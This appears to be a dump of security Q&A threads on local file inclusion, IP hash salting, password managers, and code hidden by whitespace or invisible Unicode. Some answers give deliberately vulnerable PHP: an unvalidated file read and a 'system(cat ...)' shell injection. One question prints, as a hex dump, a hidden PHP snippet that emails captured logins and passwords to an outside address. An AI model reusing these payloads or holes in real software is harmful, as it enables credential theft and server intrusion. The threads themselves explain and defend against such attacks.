<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268614","<p>GET parameters are delimited by <code>?</code> for the first parameter, and <code>&amp;</code> for the following, i.e. <code>example.com/foo.bar?firstparam=value&amp;secondparam=value</code>.</p>
<p>The HTTP protocol does not place <em>any</em> meaning on parameter names or contents. Thus, the parameter name <code>file</code> has no special meaning, and the parameter value <code>/etc/passwd</code> has no special value.</p>
<p>It's up to the http server (or program executed by the http server) what to do with parameters. It can be silently discarded, executed as verbatim or verified by some process.</p>
","8"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268622","<p>The parameter that you're sending with filename in it is being handled by the backend logic in file <code>get.php</code> most probably the logic would be to return the contents of the file mentioned in the <code>file</code> parameter.</p>
<p>The logic could be something else as well, but here this seems to be an attack vector for LFI,local file inclusion to fetch the <code>/etc/passwd</code> file from the function or logic mentioned in <code>get.php</code></p>
","1"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268632","<p>It all depends on the web server. When you request an address like <code>http://webapp.thm/index.php?page=1</code> (I'm assuming the extra <code>=</code> was a typo) your browser opens a connection to <code>webapp.thm</code> port <code>80</code>, and sends a data packet like this:<sup>1</sup></p>
<pre><code>GET /index.php?page=1 HTTP/1.1
Host: webapp.thm
User-Agent: AwesomeBrowser/1.0 (like Firefox)
Accept-Language: en
... more metadata and cookies go here ...
</code></pre>
<p>This is the only part that's standardized. What the server does with this request, is up to the server. A very basic server would look for a page called <code>/index.php?page=1</code> and give a 404 response because there isn't one. A slightly more sophisticated server would know that everything after <code>?</code> is parameters for the page and not part of the filename, so it would look for a page called <code>/index.php</code>.</p>
<p>However, we can infer this is not a very basic server. The <code>.php</code> file extension strongly indicates<sup>2</sup> this server is using a piece of software called PHP, which is a script interpreter that generates HTML pages on-demand based on PHP scripts. There's no general way to know this - you have to have some basic familiarity with what PHP is. You could probably find it out by Googling the <code>.php</code> file extension.</p>
<p>When a server with PHP installed gets a request for a file it recognizes as a PHP file, it does not simply send the file contents to the client, like an HTML file. Instead, it runs the script. Whatever the script outputs is then sent to the client. If it's written to do so, the script has the ability to access various information, like the current date and time, the client's IP address, the <code>User-Agent</code>, <code>Accept-Language</code> and other metadata, cookies, <code>?</code> parameters and so on. It runs on the server, so it can access databases and other files stored on the server.</p>
<p>And so you have the possibility that someone wrote a script that has a vulnerability. For example, I once wrote a simple script <code>download.php</code> so that <code>/download.php?file=foo.zip</code> would increment the download counter for <code>foo.zip</code> and then send the contents of <code>foo.zip</code>. The script looks approximately like this:</p>
<pre><code>&lt;?php
$file = $_GET[&quot;file&quot;]; // access the ?file= parameter

// not showing how is_valid_filename is defined
if (!is_valid_filename($file) || !file_exists($file)) {
    http_response_code(404);
    Header(&quot;Content-Type: text/plain&quot;);
    print &quot;error&quot;;
} else {

    $db = open_database();
    db_query($db, &quot;update downloads where filename=? set counter=counter+1&quot;, [$file]);
    db_close($db);

    Header(&quot;Content-Type: application/octet-stream&quot;);
    readfile($file); // outputs the contents of the file
}
?&gt;
</code></pre>
<p>If that script did not validate the filename as a valid filename to download, it would be possible that someone could request <code>/download.php?file=/etc/passwd</code> and get the contents of <code>/etc/passwd</code> because the script would call <code>readfile(&quot;/etc/passwd&quot;);</code> which is supposed to send the contents of /etc/passwd to the client. This has nothing to do with the client, the server, or HTTP, really - it would have everything to do with a faulty script. In hindsight this script could have used an HTTP redirect instead of <code>readfile</code> - that would be even safer.</p>
<hr />
<p><sup>1</sup> In HTTP/1.1 this is literally the data packet. It's not a human-readable translation - the packet is human-readable by itself. HTTP/2.0 uses a non-human-readable format to make it faster, but it basically sends the same data.</p>
<p><sup>2</sup> There's no guaranteed connection between the <code>.php</code> file extension and the PHP software. It's just a convention. They could choose to configure their copy of PHP so that files with <code>.script</code> or <code>.html</code> extensions run the PHP software, and they could choose to configure some other software to use <code>.php</code> extensions. But it is a strong indication.</p>
","13"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268658","<p>php is a script programming language that allows the web server to run programs for the client and send back the results. For it to be exploitable in the way your course expects  get.php contains a PHP script something like</p>
<pre><code>&lt;?php 
echo file_get_contents($_GET['file']);
</code></pre>
<p>php is truly a great language for writing exploitable code.
The shorter</p>
<pre><code>&lt;?php
system(&quot;cat $_GET[file]&quot;);
</code></pre>
<p>does the same gets you a shell injection too.</p>
","0"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268679","<p>It is up to the webserver how it handles a URL, it might serve a file directly, but it might also run some script.</p>
<p>php is a server side scripting language. In a typical configuration, when a file with the extension &quot;.php&quot; is requested, the server will not send the file directly but will instead pass the request to the php implementation.</p>
<p>The php implementation will read through the file looking for &lt;?php and ?&gt; tags. Text outside of these tags will be served to the client directly. Text within these tags however will be interpreted as php code and executed on the server with it's output being passed to the client.</p>
<p>file= is a query parameter which can be used by the php code, what it does with that parameter is up to the code. Perhaps for some reason they decided to just write a php script that serves the contents of a file. Perhaps the script combines the content of the file with a website template to produce a formatted page.</p>
<p>If the code is well-written it will perform some serious validation on that parameter before using it to actually load a file.</p>
<p>but a lazy or inexperienced programmer may neglect to perform any validation before passing the users filename to the file open API. Or they may perform inadequate violation, for example they may check the path doesn't start with '/' but forget to check for '..' or vice-versa.</p>
<p>This can give the attacker a way to read (possibly mangled versions of) files that they were not supposed to be able to access. On a modern system /etc/passwd will give the attacker a list of users and their IDs. On some systems it may also give them password hashes, though this is increasingly rare.</p>
","1"
"268597","268597","Using a Client and Server secret to double salt a hash","<p>I want to log IP addresses visiting my site, for aggregated statistics only and to see if the same IP address has visited twice. But I don't want to expose them.</p>
<p>My Idea is in my database.</p>
<pre><code>$IP_Verifier = hash($IP + $CONST_Server_salt + $CONST_Client_salt)
</code></pre>
<p>Where:</p>
<ul>
<li><code>$CONST_Server_salt</code> is a hardcoded value in my application code</li>
<li><code>$CONST_Client_salt</code> is some client-machine specific secret like a machine ID or a random high entropy string they keep in a file locally.</li>
</ul>
<p>The idea is I want to be able to check the same IP has arrived more than once, so I do want a constant salting, not salt-per-password. However, I can split the salt between the server and the client for added security. And this way if someone asks &quot;What's the verifier for this Big Company IP&quot;, they cannot know it without also knowing the client's secret.</p>
<ul>
<li>Is this a standard approach?</li>
<li>Is it unsafe to use const values here?</li>
</ul>
","3","4","268599","<p>Such approach is not reliable.</p>
<ol>
<li>The IP can change. Depending on provider it can change weekly, daily, or even more often.</li>
<li>Many users can have the same IP, e.g. in case they are behind a proxy.</li>
<li>Client data should not be trusted. There is no guarantee that user does not change client salt.</li>
</ol>
<p>I'd suggest you to use some kind of fingerprinting. Then you will be able to distinguish users with high probability. There is no 100% guarantee. But the probability will be higher than in the case of relying on IPs only.</p>
<p>I'd suggest not to use any client salt.</p>
<p>Also server salt makes not much sense, if this salt is used for all IPs or for all fingerprints. You should assume that the attacker obtained the salt. In such case brute-forcing hashes with or without salt will take the same time.</p>
","7"
"268597","268597","Using a Client and Server secret to double salt a hash","<p>I want to log IP addresses visiting my site, for aggregated statistics only and to see if the same IP address has visited twice. But I don't want to expose them.</p>
<p>My Idea is in my database.</p>
<pre><code>$IP_Verifier = hash($IP + $CONST_Server_salt + $CONST_Client_salt)
</code></pre>
<p>Where:</p>
<ul>
<li><code>$CONST_Server_salt</code> is a hardcoded value in my application code</li>
<li><code>$CONST_Client_salt</code> is some client-machine specific secret like a machine ID or a random high entropy string they keep in a file locally.</li>
</ul>
<p>The idea is I want to be able to check the same IP has arrived more than once, so I do want a constant salting, not salt-per-password. However, I can split the salt between the server and the client for added security. And this way if someone asks &quot;What's the verifier for this Big Company IP&quot;, they cannot know it without also knowing the client's secret.</p>
<ul>
<li>Is this a standard approach?</li>
<li>Is it unsafe to use const values here?</li>
</ul>
","3","4","268604","<p>To answer your first question:</p>
<p>No, the method you described is not a standard approach.</p>
<p>The current industry best practices for authentication are set in <a href=""https://pages.nist.gov/800-63-3/sp800-63b.html"" rel=""nofollow noreferrer"">NIST Special Publication 800-63B</a>, and notably say not to hash passwords, but to use a key stretching algorithm, such as PBKDF2 or BALLOON. In my research, the key stretching algorithms that are most often suggested by security researchers are PBKDF2, bcrypt, scrypt, and Argon2.</p>
<p>The entirety of SP 800-63 is relatively easy to read. It might be contradicted by other standards out there, notably PCI DSS.  While I personally believe that PCI and other standards actively decrease security when compared to the NIST standards, you should consult with your company's legal department, as following other standards may reduce liability.</p>
<p>For your follow up question:</p>
<p>A constant value used as a salt is called <em>pepper</em>, and reduces the security on a per-password basis.  It is still better than no salt at all, but unless you system is extremely starved for resources to the point where you database can't grow a couple of kilobytes without impacting performance, there is no practical point in having a hardcoded salt rather than a per-password salt.</p>
<p>The point of salt is to prevent an attacker from trivially reversing hashes using a rainbow table.  When using a constant as pepper, an attacker can build a new rainbow table based on that hardcoded value.</p>
<p>Splitting the place where a salt is stored—such as a constant in your application and a constant on the client—does not increase the security of the salt; it merely makes two separate salts.</p>
<p>A couple things about salt:</p>
<p>A salt is not a secret. It should not be stored in weird places, encrypted, or derived from some obscure value. Putting it right next the the result of key stretching/hashing is perfectly fine and is what is used in most standard, secure password verification systems.</p>
<p>A salt should be generated from a cryptographically secure pseudo-random number generator (csprng), and there should be a unique one per password.  There are only 4 billion IPv4 IP addresses out there, and they tend to clump by region/ISP.</p>
<p>IP addresses are definitely not generated by a csprng, and it's possible that multiple users could have the same IP address, thanks to NAT, and possible that a single user could have multiple IP addresses, thanks to ISPs pooling and randomly assigning IP addresses.  These cases are outside of the user's control.</p>
<p>If you do want to enforce a single IP address to a given user, then store it as an additional field, rather than as part of the authentication. That way, when you realize just how bad of an idea it is, you won't have to rework all of your auth system.</p>
","5"
"268597","268597","Using a Client and Server secret to double salt a hash","<p>I want to log IP addresses visiting my site, for aggregated statistics only and to see if the same IP address has visited twice. But I don't want to expose them.</p>
<p>My Idea is in my database.</p>
<pre><code>$IP_Verifier = hash($IP + $CONST_Server_salt + $CONST_Client_salt)
</code></pre>
<p>Where:</p>
<ul>
<li><code>$CONST_Server_salt</code> is a hardcoded value in my application code</li>
<li><code>$CONST_Client_salt</code> is some client-machine specific secret like a machine ID or a random high entropy string they keep in a file locally.</li>
</ul>
<p>The idea is I want to be able to check the same IP has arrived more than once, so I do want a constant salting, not salt-per-password. However, I can split the salt between the server and the client for added security. And this way if someone asks &quot;What's the verifier for this Big Company IP&quot;, they cannot know it without also knowing the client's secret.</p>
<ul>
<li>Is this a standard approach?</li>
<li>Is it unsafe to use const values here?</li>
</ul>
","3","4","268605","<p>There are some points:</p>
<ol>
<li><p>IP addresses are already on the HTTP server logs</p>
<p>You are not hashing nor encrypting them, but they are recorded.</p>
</li>
<li><p>You are not exposing IP addresses by default</p>
<p>Unless you have a mechanism to query your database and expose the information, all IP addresses are protected inside your database.</p>
</li>
<li><p>IP addresses are not good for statistics</p>
<p>There are a couple things that will make your statistics unreliable: dynamic IP, roaming clients, mobile users, and Carrier Grade NAT.</p>
<p>Dynamic IP users will have their IP changed from time to time, and it may seem like one client is accessing twice but in fact are two different clients that got the same IP allocated.</p>
<p>Roaming clients are those who connect thru various wireless networks. This will make the same client have distinct IP addresses on your system, and distinct clients having the same IP.</p>
<p>Mobile users may all have a small pool of external IP addresses being used by the telecom operator. This will look like several hundreds (or thousands) of access by a single client.</p>
<p>Carrier Grade NAT: on small ISPs, that is common: the ISP have a handful of Class C Networks, and use NAT to allow its clients to access the internet.</p>
</li>
</ol>
<p>You can collect better statistics using tracking cookies, or a long-lived session, or using client fingerprinting.</p>
","4"
"268597","268597","Using a Client and Server secret to double salt a hash","<p>I want to log IP addresses visiting my site, for aggregated statistics only and to see if the same IP address has visited twice. But I don't want to expose them.</p>
<p>My Idea is in my database.</p>
<pre><code>$IP_Verifier = hash($IP + $CONST_Server_salt + $CONST_Client_salt)
</code></pre>
<p>Where:</p>
<ul>
<li><code>$CONST_Server_salt</code> is a hardcoded value in my application code</li>
<li><code>$CONST_Client_salt</code> is some client-machine specific secret like a machine ID or a random high entropy string they keep in a file locally.</li>
</ul>
<p>The idea is I want to be able to check the same IP has arrived more than once, so I do want a constant salting, not salt-per-password. However, I can split the salt between the server and the client for added security. And this way if someone asks &quot;What's the verifier for this Big Company IP&quot;, they cannot know it without also knowing the client's secret.</p>
<ul>
<li>Is this a standard approach?</li>
<li>Is it unsafe to use const values here?</li>
</ul>
","3","4","268625","<p>You might take inspiration from some of the cookie-free and privacy-aware web analytics solutions that have sprung up. These include <a href=""https://usefathom.com/blog/anonymization"" rel=""nofollow noreferrer"">Fathom</a>, <a href=""https://plausible.io/data-policy"" rel=""nofollow noreferrer"">Plausible</a> and <a href=""https://docs.ackee.electerious.com/#/docs/Anonymization"" rel=""nofollow noreferrer"">Ackee</a>. They all generally attempt to solve the following problem: track whether a user has already visited the site for aggregation purposes, but without storing information on their machine (for ePrivacy Directive reasons), and without storing identifying information on the server (for GDPR reasons).</p>
<p>They generally work by creating a hash of the connecting IP, the site they're connecting to and the user-agent, as well as a rotating salt. Pseudo-code from <a href=""https://plausible.io/data-policy#how-we-count-unique-users-without-cookies"" rel=""nofollow noreferrer"">Plausible's explainer</a> looks like:</p>
<pre><code>hash(daily_salt + website_domain + ip_address + user_agent)
</code></pre>
<p>Each of these are used for:</p>
<dl>
<dt>Daily rotating salt</dt>
<dd>Important for a number of reasons:
<ul>
<li>Using a server-generated salt limits the risk of rainbow table attacks, and having it time-limited (e.g. rotating daily) means that even custom rainbow tables would only affect a small subset of data.</li>
<li>Using a time-limited salt means that even an attacker with full access to the database and server would be unable to check whether a given user has visited the site, assuming the salt has been rotated since.</li>
</ul>
This comes with the trade-off of only being able to track whether a visitor has accessed the site within the last salt rotation cycle.
<dt>IP</dt>
<dd>Used as a proxy for identifying the individual user. While not perfect (see ThoriumBR's answer), IP addresses do act as a coarse identifier for when exact identification isn't critical.</dd>
<dt>User-Agent</dt>
<dd>Used to differentiate different devices coming from the same IP. This alleviates some of the issues with using IP for identification (although not all).</dd>
<dt>Domain ID</dt>
Acts as a salt, to avoid collisions when multiple different sites track visitors using the same database and rotating salt. Mostly used for practical reasons.</dd>
</dl>
<hr />
<p>While some limitations apply to this scheme, it is generally a trade-off between security/privacy and usability. <a href=""https://plausible.io/data-policy#how-we-count-unique-users-without-cookies"" rel=""nofollow noreferrer"">As described by Plausible</a> (who admittedly have a vested interest in framing it positively):</p>
<blockquote>
<p>In our testing, using IP addresses to count visitors is remarkably accurate when compared to using a cookie. In some cases it might even be more accurate than using a cookie because some visitors block cookies altogether.</p>
<p>The biggest limitation with this approach is that we cannot do good retention analysis with Plausible. We cannot show stats like New vs Returning visitors because they rely on having a persistent user identifier.</p>
<p>If the same visitor visits your site five times in one day we will show that as one unique visitor. But if the same visitor visits your site on five different days in a month we would show that as five unique visitors.</p>
</blockquote>
","2"
"268568","268568","Understanding Password Manager Chicken and Egg problem","<p>I read that Password Managers are a more secure option than remembering passwords. I am currently evaluating <em>Passwords Managers with cloud synchronization</em> and there is something that really confused me.</p>
<p>For cloud synchronization platforms, usually not free, you first need to create an account with a platform account password <em>password-1</em>. This account is mainly used for billing purposes. Then, you have to create a second password <em>password-2</em>, named Master Password, which is used to generate all the other passwords. So initially, you have 2 passwords.</p>
<p>In this situation, is it a good practice to replace <em>password-1</em> with a password generated from <em>password-2</em>?</p>
","0","3","268569","<p>Password managers are not a more secure option than remembering passwords, they just generate more complex passwords (that cannot be easily cracked/are not in wordlists) and store them. If you could remember high-entropy/complexity passwords without computer help, that is technically the most secure option.</p>
<p>Assuming you cannot remember random alphanumeric strings, using a password manager to store your password for the cloud account carries the same advantages as any other account - decreased susceptibility to various bruteforcing attacks. In summary, yes, replacing it is, for most users, more secure.</p>
","1"
"268568","268568","Understanding Password Manager Chicken and Egg problem","<p>I read that Password Managers are a more secure option than remembering passwords. I am currently evaluating <em>Passwords Managers with cloud synchronization</em> and there is something that really confused me.</p>
<p>For cloud synchronization platforms, usually not free, you first need to create an account with a platform account password <em>password-1</em>. This account is mainly used for billing purposes. Then, you have to create a second password <em>password-2</em>, named Master Password, which is used to generate all the other passwords. So initially, you have 2 passwords.</p>
<p>In this situation, is it a good practice to replace <em>password-1</em> with a password generated from <em>password-2</em>?</p>
","0","3","268572","<blockquote>
<p>password password-2, named Master Password, which is used to generate all the others passwords</p>
</blockquote>
<p>The widely used password managers don't generate passwords based on a single one. The can generate, but <em>you</em> define rules for a new password: What characters are to be used, length, some additional requirements.</p>
<p>The master password is used to <em>unlock</em> other passwords, not to generate passwords.</p>
<blockquote>
<p>is it a good practice to replace password-1 with a password generated from password-2?</p>
</blockquote>
<p>No. Making one password depending on the other is a bad practice. For instance, you may suspect that your <em>password-1</em> was leaked (e.g. you believe that smb. has seen as you type it in). In such case you can easily change this password. Or the website may have a policy to force users change their passwords regularly, e.g. every 3 months or every year. Again, if one password is generated based on another, this can lead to difficulties.</p>
<p>But in case you question is based on misunderstanding (<em>password-1</em> is actually not generated based on <em>password-2</em> as you supposed, but is actually stored in the password database that is locked with <em>password-2</em>), then it is fine to store it in the password database together with all other passwords. Even if there is a technical problem in the password manager and you need help, and you have no access to your account password because <em>password-1</em> is stored in the password manager, you can still reset it, depending on provider, they can use your email and the 2nd if you configured it.</p>
","1"
"268568","268568","Understanding Password Manager Chicken and Egg problem","<p>I read that Password Managers are a more secure option than remembering passwords. I am currently evaluating <em>Passwords Managers with cloud synchronization</em> and there is something that really confused me.</p>
<p>For cloud synchronization platforms, usually not free, you first need to create an account with a platform account password <em>password-1</em>. This account is mainly used for billing purposes. Then, you have to create a second password <em>password-2</em>, named Master Password, which is used to generate all the other passwords. So initially, you have 2 passwords.</p>
<p>In this situation, is it a good practice to replace <em>password-1</em> with a password generated from <em>password-2</em>?</p>
","0","3","268587","<p>[Disclosure: I work for 1Password]</p>
<p><strong>Do <em>not</em> reuse your password manager Master Password</strong> for anything, including for other services that the password manager vendor might offer.</p>
<p>I am not sure which password manager you are describing with a separate billing service, but I very much understand how a service could be designed that way. (We don't do it that way at 1Password, but this is a trade-off, which others may do differently.)</p>
<p>In all likelihood, your billing account password is a password used for <em>authentication</em> while the master password is used for <em>encryption</em>. Because people mostly encounter passwords for authentication and the metaphors we that are used for talking about passwords and unlocking are all better metaphors for authentication, most people don't see the distinct security properties of passwords used for encryption.</p>
<p>In a well-designed system, the vendor of your password manager is not able to reset your Master Password. If you forget it and you haven't set up some alternative recovery mechanism, you will be forever locked out of your data. That is good design for a password manager because it means that the operators of the service can't get into your data if they are compromised (or evil.) A password used for authentication can always be reset by the service.</p>
<p>Different password managers that offer a synching or on-line service have taken different strategies dealing with the fact that users need both a way to authenticate with the service and a way to decrypt their data. Some, like the one that you describe, has you use two separate passwords. I know that at one point Dashlane worked this way and had set up contradictory password requirements for the authentication and Master Password password in order to prevent people from reusing the same one for both. I don't know if they still do this.</p>
<p>With 1Password, we are weren't going to change our name when we launched our service. So we designed an authentication system around a PAKE, which means that no information about a user's one password is transmitted to the server during authentication.  While I naturally think our design choice is better, I understand the rational for the two password design. And if the two password design is set up as I imagine it might be, then you should definitely <em>not</em> use the same password for each.</p>
","1"
"268435","268435","Malicious code somehow hidden with whitespace?","<p>I recently came across a php file on a compromised website that had what appeared (in Sublime Text) to be a huge white-space gap.  When I run a diff against the original source file I can clearly see the malicious code which is snagging logins and passwords and emailing them to <em>someone</em>.</p>
<p>The malicious code can also be clearly seen using vim.</p>
<p>My assumption is that this is some kind of encoding exploit but I can't for the life of me figure out how it's being hidden and I've never seen anything like this before.</p>
<p>Is anyone familiar with this kind of hidden code exploit?  Is there a way to make it visible inside Sublime? I realize it may be difficult to say without seeing the file - I am happy to provide said file if need be.</p>
<p><strong>EDIT - Hex dump as requested:</strong></p>
<pre><code>0000000 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
*
00000c0 20 20 20 20 20 20 20 20 20 69 66 28 24 74 68 69
00000d0 73 2d 3e 75 73 65 72 2d 3e 6c 6f 67 69 6e 28 24
00000e0 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70
00000f0 6f 73 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2c
0000100 20 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d
0000110 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64 27
0000120 5d 29 29 7b 24 73 6d 61 69 6c 3d 24 5f 53 45 52
0000130 56 45 52 5b 27 48 54 54 50 5f 48 4f 53 54 27 5d
0000140 2e 24 5f 53 45 52 56 45 52 5b 27 52 45 51 55 45
0000150 53 54 5f 55 52 49 27 5d 2e 22 7c 22 2e 24 74 68
0000160 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70 6f 73
0000170 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2e 22 7c
0000180 22 2e 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74
0000190 2d 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64
00001a0 27 5d 3b 6d 61 69 6c 28 22 61 6c 74 2e 65 69 2d
00001b0 36 6f 6b 36 77 36 76 32 40 79 6f 70 6d 61 69 6c
00001c0 2e 63 6f 6d 22 2c 24 5f 53 45 52 56 45 52 5b 27
00001d0 48 54 54 50 5f 48 4f 53 54 27 5d 2c 24 73 6d 61
00001e0 69 6c 2c 22 46 72 6f 6d 3a 20 61 64 6d 69 6e 40
00001f0 66 6c 79 2e 63 6f 6d 5c 72 5c 6e 52 65 70 6c 79
0000200 2d 74 6f 3a 20 61 6c 74 2e 65 69 2d 36 6f 6b 36
0000210 77 36 76 32 40 79 6f 70 6d 61 69 6c 2e 63 6f 6d
0000220 22 29 3b
0000223
</code></pre>
","50","3","268438","<p>This is a very old story:</p>
<ul>
<li><a href=""https://trojansource.codes/"" rel=""noreferrer"">https://trojansource.codes/</a></li>
<li><a href=""https://en.wikipedia.org/wiki/Trojan_Source"" rel=""noreferrer"">https://en.wikipedia.org/wiki/Trojan_Source</a></li>
<li><a href=""https://lwn.net/Articles/874951/"" rel=""noreferrer"">https://lwn.net/Articles/874951/</a></li>
<li><a href=""https://www.bleepingcomputer.com/news/security/invisible-characters-could-be-hiding-backdoors-in-your-javascript-code/"" rel=""noreferrer"">https://www.bleepingcomputer.com/news/security/invisible-characters-could-be-hiding-backdoors-in-your-javascript-code/</a></li>
<li><a href=""https://trojansource.codes/trojan-source.pdf"" rel=""noreferrer"">https://trojansource.codes/trojan-source.pdf</a></li>
<li><a href=""https://developers.redhat.com/articles/2022/01/12/prevent-trojan-source-attacks-gcc-12"" rel=""noreferrer"">https://developers.redhat.com/articles/2022/01/12/prevent-trojan-source-attacks-gcc-12</a></li>
</ul>
<p>In short there are certain unicode symbols which allow to hide code from certain text editors. If your text editor doesn't know how to deal with these attacks, I'd highly recommend using something different.</p>
","14"
"268435","268435","Malicious code somehow hidden with whitespace?","<p>I recently came across a php file on a compromised website that had what appeared (in Sublime Text) to be a huge white-space gap.  When I run a diff against the original source file I can clearly see the malicious code which is snagging logins and passwords and emailing them to <em>someone</em>.</p>
<p>The malicious code can also be clearly seen using vim.</p>
<p>My assumption is that this is some kind of encoding exploit but I can't for the life of me figure out how it's being hidden and I've never seen anything like this before.</p>
<p>Is anyone familiar with this kind of hidden code exploit?  Is there a way to make it visible inside Sublime? I realize it may be difficult to say without seeing the file - I am happy to provide said file if need be.</p>
<p><strong>EDIT - Hex dump as requested:</strong></p>
<pre><code>0000000 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
*
00000c0 20 20 20 20 20 20 20 20 20 69 66 28 24 74 68 69
00000d0 73 2d 3e 75 73 65 72 2d 3e 6c 6f 67 69 6e 28 24
00000e0 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70
00000f0 6f 73 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2c
0000100 20 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74 2d
0000110 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64 27
0000120 5d 29 29 7b 24 73 6d 61 69 6c 3d 24 5f 53 45 52
0000130 56 45 52 5b 27 48 54 54 50 5f 48 4f 53 54 27 5d
0000140 2e 24 5f 53 45 52 56 45 52 5b 27 52 45 51 55 45
0000150 53 54 5f 55 52 49 27 5d 2e 22 7c 22 2e 24 74 68
0000160 69 73 2d 3e 72 65 71 75 65 73 74 2d 3e 70 6f 73
0000170 74 5b 27 75 73 65 72 6e 61 6d 65 27 5d 2e 22 7c
0000180 22 2e 24 74 68 69 73 2d 3e 72 65 71 75 65 73 74
0000190 2d 3e 70 6f 73 74 5b 27 70 61 73 73 77 6f 72 64
00001a0 27 5d 3b 6d 61 69 6c 28 22 61 6c 74 2e 65 69 2d
00001b0 36 6f 6b 36 77 36 76 32 40 79 6f 70 6d 61 69 6c
00001c0 2e 63 6f 6d 22 2c 24 5f 53 45 52 56 45 52 5b 27
00001d0 48 54 54 50 5f 48 4f 53 54 27 5d 2c 24 73 6d 61
00001e0 69 6c 2c 22 46 72 6f 6d 3a 20 61 64 6d 69 6e 40
00001f0 66 6c 79 2e 63 6f 6d 5c 72 5c 6e 52 65 70 6c 79
0000200 2d 74 6f 3a 20 61 6c 74 2e 65 69 2d 36 6f 6b 36
0000210 77 36 76 32 40 79 6f 70 6d 61 69 6c 2e 63 6f 6d
0000220 22 29 3b
0000223
</code></pre>
","50","3","268443","<p>There are several Unicode characters that are not visible. The space character obviously and the non-breaking space are quite commonly used. But there are more, and some may be allowed in programming languages that support unicode in source code. For example in Swift it is possible to have a valid variable name that is just invisible (I haven't checked C++, Java, C# and so on but they may be the same). Worst case, you see a single &quot;=&quot; character, and it is really an assignment from one variable with an invisible name to another.</p>
<p>There are also several pairs of Unicode characters that look exactly the same. For example uppercase A and uppercase greek alpha. You have the same problem there. That's probably even more dangerous, because you see code that looks valid (it is actually valid) but you don't realise it's dangerous - with invisible variable names, you can see that obviously something is dodgy.</p>
